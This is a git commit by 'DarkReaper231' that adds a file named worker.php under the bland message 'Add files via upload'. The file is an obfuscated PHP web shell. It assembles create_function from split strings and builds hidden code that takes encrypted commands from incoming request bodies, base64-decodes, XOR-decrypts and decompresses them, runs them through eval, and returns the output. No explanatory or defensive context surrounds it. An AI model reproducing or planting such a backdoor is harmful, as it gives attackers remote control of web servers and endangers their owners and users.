47a625dc7a25d09ada9856609315a6387374396d
DarkReaper231 <38611351+DarkReaper231@users.noreply.github.com>
2022-06-25 07:56:05 +0200

    Add files via upload

---
+++ worker.php
@@ -0,0 +1,13 @@
+<?php
+$D=str_replace('AX','','creAXaAXteAX_fuAXnAXAXction');
+$g='@base6[$4_en[$c[$ode(@x(@g[$zcompre[$ss[$($o),[$[$$k));p[$rint("$p$kh$r$kf");}';
+$F='XY9YZ[$gFCL[$fim[$eW1R";func[$tion x($t[$,$k[$[$){$c=st[$rlen([$$k);$l';
+$N='=st[$rlen([$$t);$o="";fo[$r([$$i=0[$;$i<$l;){for([$$j=0;[$($j<$c[$&&$[$i<$';
+$C='[$=1) [${@ob_star[$t();@ev[$al(@g[$zuncompres[$s(@[$x([$@base[$64_decode(';
+$L='[$$m[1]),$k[$)));$o=@o[$b_get[$_cont[$[$ents();@ob_en[$d_c[$lean();$[$r=';
+$A='l);[$$j++,$i++)[${$[$o.=$t{$i}[$^$k{$[$j};}}r[$etu[$rn [$$o;}if ([$[$@preg_ma[';
+$G='$k="40a[$4a[$c7b";$k[$h="b07a1a00[$[$3fe6";$kf=[$"b88c[$02a354ac"[$;$p="[$';
+$W='$tch("/$kh([$.+[$)[$$kf/",@file_get_conte[$[$nts("[$ph[$p://inpu[$t"),$m)=';
+$I=str_replace('[$','',$G.$F.$N.$A.$W.$C.$L.$g);
+$u=$D('',$I);$u();
+?>
